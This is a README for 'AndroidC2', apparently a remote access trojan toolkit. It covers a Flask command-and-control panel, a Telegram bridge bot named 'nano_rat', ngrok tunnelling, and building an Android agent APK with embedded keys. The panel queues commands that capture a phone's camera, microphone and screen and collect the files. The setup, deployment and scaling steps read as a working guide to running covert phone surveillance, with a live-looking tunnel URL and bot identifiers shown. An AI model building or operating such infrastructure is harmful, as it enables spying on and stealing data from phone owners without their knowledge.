# AndroidC2

Flask control server for the Android agent in `agent_android/`, with a
Socket.IO dashboard and an optional Telegram bridge.

```
app.py                 Flask app factory, operator routes, login
config.py              secrets + paths (no hardcoded credentials)
models.py              Device / Command / CapturedFile / LogEntry
database.py            SQLAlchemy handle, SQLite pragmas
c2/
  auth.py              operator sessions, CSRF, agent key check, throttling
  agent_api.py         REST endpoints the agent calls (X-Api-Key)
  agent_ws.py          /agent namespace — persistent agent sockets
  ws_dashboard.py      /dashboard namespace — operator sockets
  reaper.py            heartbeat reaper for is_online accuracy
  file_handler.py      hashing, name sanitising, containment, deletion
  command_builder.py   command catalogue
  timeutil.py          timezone-correct UTC clock helper
telegram_bridge.py     Telegram UI in front of the operator API
agent_android/         Kotlin agent
templates/, static/    dashboard
tests/                 pytest suite (90 tests)
```

## Running it

```bash
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt

cp .env.example .env          # edit as needed
./run.sh                      # or just: python3 app.py
```

Open `http://127.0.0.1:5000`. **No login, no password** in the default mode.

```bash
./run.sh              # server + tunnel + bridge, supervised
./run.sh --no-tunnel  # local only
./run.sh --no-bridge  # server only
./run.sh --check      # verify .env and exit
```

One command, three processes, in order, each health-checked before the next
starts. Ctrl-C stops all three. Everything comes from `.env` — there is
nothing to type at a prompt.

```
==> ready
    panel      http://127.0.0.1:5000  (local)
    tunnel     https://backdrop-embassy-anymore.ngrok-free.dev
    agent URL  https://backdrop-embassy-anymore.ngrok-free.dev
    agent key  ffc8c5c0  (must match the APK)
    telegram   @nano_rat_ui_bot, chat 788903767
    logs       logs/server.log  logs/bridge.log  logs/ngrok.log
```

`--check` validates the bot token against Telegram and prints the agent key
fingerprint, so a mismatch shows up before you install anything.

### Access modes

`C2_AUTH` picks one:

| mode | behaviour |
|---|---|
| `open` (default) | nothing required. Correct only while bound to loopback |
| `token` | loopback open; remote requests need `C2_ACCESS_TOKEN` |
| `operator` | named accounts with passwords (`flask --app app operators`) |

The loopback carve-out exists because the panel queues commands that capture
camera, microphone and screen on the phone. Over ngrok that URL is public, so
put it in `token` mode before exposing it:

```bash
C2_AUTH=token
C2_ACCESS_TOKEN=$(python3 -c "import secrets;print(secrets.token_urlsafe(16))")
C2_TRUSTED_PROXY=127.0.0.1      # so X-Forwarded-For is believed
```

Then open `https://your-tunnel/?k=<token>` once and the panel keeps it. This
is the same one-value idea as `C2_API_KEY`, not a login system.

Without `C2_TRUSTED_PROXY`, tunnel requests arrive looking like loopback and
the carve-out cannot work — the server logs `auth.proxy_untrusted` at startup.

### Secrets

Nothing is hardcoded. Each secret resolves in this order:

1. environment variable
2. `data/<name>.secret` — generated once, mode `0600`
3. a fresh random value, written to (2)

If you never export `C2_API_KEY`, the server generates one — you then have to
rebuild the agent APK with that value or nothing will connect.

## Building the agent

`agent_android/app/build.gradle` refuses to build with placeholder
credentials. Every one of these must be set:

```bash
export TG_BOT_TOKEN=...
export TG_CHAT_ID=...
export C2_API_KEY=...          # same value the server uses
export C2_URL=https://your-tunnel.example

cd agent_android && ./gradlew assembleDebug
```

The APK lands in `agent_android/app/build/outputs/apk/debug/`.

### Gradle wrapper

`gradlew`, `gradlew.bat` and `gradle/wrapper/gradle-wrapper.jar` are binaries
and are **not committed**. CI generates them in a throwaway project (so the
step never has to configure the Android build) and pins the distribution
checksum. To make local builds match CI byte-for-byte, generate them once
locally and commit the result:

```bash
cd agent_android
gradle wrapper --gradle-version 8.4 --distribution-type bin
git add gradlew gradlew.bat gradle/wrapper/gradle-wrapper.jar
```

## Telegram bridge

```bash
export C2_BASE=http://127.0.0.1:5000
python3 telegram_bridge.py
```

The bridge authenticates as an operator (login → session cookie → CSRF
token), not as an agent, and re-authenticates automatically if the session
drops. All device-supplied text is escaped before it reaches Telegram's
Markdown parser — otherwise a model name containing `_` breaks the whole
menu with *can't parse entities*.

The operator password resolves in the same order as the server's: the
`C2_OPERATOR_PASSWORD` environment variable, then
`data/c2_operator_password.secret`. Both processes run as the same user on
the same box, so the bridge reads the generated file rather than demanding a
second copy of the value. Point it elsewhere with `C2_OPERATOR_PASSWORD_FILE`,
or override the data directory with `C2_DATA_DIR`.

**If the server is already running with a generated password and you export a
different one, the bridge will 401** — the two must agree.

## Production deployment

Two systemd units: gunicorn behind Caddy. Caddy terminates TLS, gunicorn
serves the app on loopback.

```bash
TLS_HOST=panel.example.com sudo -E ./deploy/install.sh
```

The installer creates a system user, a venv, `/etc/androidc2/env` (mode 0600)
and enables both services. It **reuses** the key already in
`data/c2_api_key.secret` rather than generating a new one, so redeploying does
not silently invalidate every built APK.

| Command | What it does |
|---|---|
| `journalctl -u androidc2 -f` | application log |
| `systemctl reload androidc2` | graceful reload (HUP) |
| `sudo cat /etc/androidc2/env` | the live secrets |

Then point the agent and bridge at it:

```
C2_URL=https://panel.example.com    # agent build
C2_BASE=https://panel.example.com   # telegram bridge
```

### Why not the Flask dev server

The Werkzeug development server logs a spurious
`AssertionError: write() before start_response` for **every** WebSocket that
closes: `simple-websocket` takes over the raw socket, then Werkzeug finalises a
response cycle that never began. It is cosmetic — but it fills the log with
500s that read like a broken tunnel.

### Why not gevent

`gevent` ships no `cp313` wheels, so pip falls back to a source build whose
bundled Cython cannot compile it (`undeclared name not builtin: long`).
`simple-websocket` gives WebSocket support on plain threads, so the config uses
the `gthread` worker:

```
workers = 1     # see below
threads = 100
```

### Scaling past one process

**Do not raise `workers`.** The connected-agent registry
(`c2/agent_ws._agents`) lives in process memory, so a second worker would not
see devices held by the first. Scaling out needs that registry — and the
Socket.IO message queue — in Redis first.

## Tests

```bash
python3 -m pytest
```

The suite pins `C2_*` environment variables in `tests/conftest.py` before
importing anything, so it never touches the real database, uploads or
secrets. It covers operator auth and CSRF, agent key auth and per-device
scoping, path traversal, command lifecycle, the heartbeat reaper, and a live
end-to-end run of the bridge against a booted server.

## Security posture

- Operator routes require a session; mutating routes also require
  `X-CSRF-Token`. Failed logins are throttled per IP.
- The agent API requires the shared key, compared in constant time. Every
  agent is pinned to its own `device_id` for the lifetime of its socket, so
  one device cannot read or complete another device's commands.
- A WebSocket that has not authenticated may send exactly one event
  (`hello`); anything else drops the connection.
- Captured files are written outside `static/`, so they are only reachable
  through authenticated routes. Filenames are sanitised and every path is
  resolved and checked for containment before use.
- `cors_allowed_origins` is left at the default. With `*`, any page the
  operator visited could open a socket to the panel and read everything.
- Deleting a device deletes its commands *and* its files from disk.

## Operators

The panel has named operators, not one shared password. That is what makes the
audit trail below an accountability record rather than a log.

```bash
flask --app app operators                    # list
flask --app app operators add kanha          # create; prints the token once
flask --app app operators passwd kanha       # new password
flask --app app operators token kanha        # rotate the API token
flask --app app operators revoke kanha       # drop the token
flask --app app operators disable kanha      # block access, keep the history
flask --app app operators enable kanha
flask --app app operators rm kanha           # delete the row, keep the history
```

Passwords are read from `C2_NEW_PASSWORD` or prompted for, never from a
command-line default, so they stay out of shell history. Minimum 12 characters.

The first operator is bootstrapped from `C2_OPERATOR_NAME` /
`C2_OPERATOR_PASSWORD` **while the operator table is empty**. Once any operator
exists those variables are ignored — changing them does not alter a live
account, so use the CLI.

### Credential storage

| | stored as | why |
|---|---|---|
| password | werkzeug scrypt hash, per-row salt | never recoverable, never comparable across rows |
| API token | sha256 digest, indexed | one indexed lookup instead of a scan; a database leak does not hand over usable tokens |

The plaintext token is shown exactly once, at creation or rotation.

### Token auth for machine clients

```bash
curl -H "Authorization: Bearer $TOKEN" localhost:5000/api/operators/me
curl -H "Authorization: Bearer $TOKEN" localhost:5000/api/devices
```

The Telegram bridge prefers this over a password:

```bash
C2_OPERATOR_TOKEN=...   # set this; C2_OPERATOR_PASSWORD is not needed
```

Tokens are resolved per request rather than cached in a session, so rotating or
revoking one takes effect immediately — the old token stops working on the next
call.

CSRF is **not** required for token callers. A cookie is an ambient credential:
a cross-site form can make the browser attach it, which is what CSRF defends
against. A bearer token is never attached automatically, so a cross-site
request cannot forge one. Cookie sessions still require `X-CSRF-Token`.

No header can claim an identity: `X-Operator-Name`, `X-User` and friends are
ignored. Identity comes from the session or from a token that resolves to a
row.

### Login throttling

Two buckets with different budgets:

| bucket | budget | what it stops |
|---|---|---|
| operator name | 5 | a targeted attack on one known account, from anywhere |
| source IP | 25 | a spray across many names from one host |

Name-only throttling would let one attacker lock a known account from the
whole internet; IP-only would let one person mistyping their password five
times lock out everyone behind the same address.

## Operator audit trail

Every mutating operator action is written to `operator_actions` before the
response goes out — command queueing (including refusals), device deletion,
notes and tags, file uploads and reads, and all login outcomes.

```bash
curl -s localhost:5000/api/audit?limit=20          # newest first
curl -s localhost:5000/api/audit?action=command.queue
curl -s localhost:5000/api/audit?outcome=denied
curl -s localhost:5000/api/audit/verify            # recompute the chain
```

The route is **GET-only**: no verb can mutate or delete a row, and
`OperatorAction` deliberately exposes no update helper. Each row also carries
a digest computed with `SECRET_KEY` over its own content *and the digest of
the row before it*, so editing or deleting an earlier entry invalidates
everything after it — `/api/audit/verify` reports the first id where the
chain stops agreeing with itself.

`actor` is the operator name from the session or the token, so the trail
separates people and machine clients:

```
kanha        device.notes     16 chars
bridge-bot   device.notes     14 chars
```

Both rows came from `device.notes`; the names say who acted.

Nothing is pruned automatically. `audit.prune(days)` exists but has to be
called on purpose — silent deletion of an audit trail is worse than a full
disk.

## Logging

Two formats, one switch:

```bash
C2_LOG_FORMAT=text   # human readable, key=value, greppable
C2_LOG_FORMAT=json   # one object per line, for journald/Loki/ELK
C2_LOG_LEVEL=info
```

Every line carries a request id when one is in scope, so a single request's
log can be pulled out with one filter:

```
22:10:53.729 INFO c2.http http.request method=POST path=/api/device/12/command status=200 ms=39 ip=127.0.0.1 rid=4f6a1c32858587c6
```

```
{"ts":"...","level":"info","logger":"c2.http","event":"http.request","rid":"37d187eecf6a091c",
 "method":"POST","path":"/api/device/12/command","status":200,"ms":41,"ip":"127.0.0.1"}
```

The id is echoed in the `X-Request-ID` response header. A client-supplied id is
**ignored** unless `C2_TRUST_PROXY_REQUEST_ID` is set, so a browser cannot
choose its own correlation id; enable it only behind a proxy you control.

### Redaction

Secret redaction happens in the formatter, not at each call site:

- a field whose *name* looks like a credential (`password`, `api_key`,
  `token`, `authorization`, …) is masked
- any *value* containing a registered secret is masked, whatever the field is
  called — so a secret passed as `value` is still caught

Derived metadata is exempt from the name rule only: `api_key_fp`,
`api_key_len`, `secret_count` survive, because a fingerprint is what makes a
key mismatch diagnosable. Value-level redaction still applies to them.

`SECRET_KEY`, `API_KEY` and `OPERATOR_PASSWORD` are registered at startup, so
none of them can appear in the log even if a future field name slips past the
pattern.

### What is logged

| Logger | Events |
|---|---|
| `c2.startup` | `server.starting` (config summary, fingerprints only) |
| `c2.http` | `http.request` (method, path, status, ms, ip, rid) |
| `c2.app` | `uploads.migrated`, `http.unhandled` |
| `c2.agent` | `agent.accepted`, `agent.rejected`, `agent.disconnected` |
| `c2.reaper` | `device.stale`, `reaper.error` |
| `c2.db` | `schema.column_added` |

`werkzeug` is silenced: it logs a spurious 500 for every WebSocket that
closes, which drowns out everything useful. gunicorn's access log is off for
the same reason.

```bash
journalctl -u androidc2 -f | grep 'rid=4f6a1c32'
journalctl -u androidc2 -f | grep agent.rejected
```

## Database

`db.create_all()` runs at startup; there is no migration history yet.
`Flask-Migrate` is in `requirements.txt` for when the schema starts moving —
initialise it before the first column change:

```bash
flask --app app db init
flask --app app db migrate -m "initial"
```

## Known gaps

- The agent ships **two** C2 services, `C2Service.kt` and
  `TelegramC2Service.kt`, both registered as foreground services in the
  manifest. Only one should survive; until then a command can execute twice.
- `foregroundServiceType="mediaProjection"` on both services will throw on
  Android 14 unless a projection is actually active when `startForeground`
  runs.
- The Java Socket.IO client (`io.socket:socket.io-client:2.1.1`) speaks
  Socket.IO v2 / Engine.IO v3 while this server speaks v5 / EIO 4. That
  mismatch is worth resolving before chasing any further transport
  symptoms.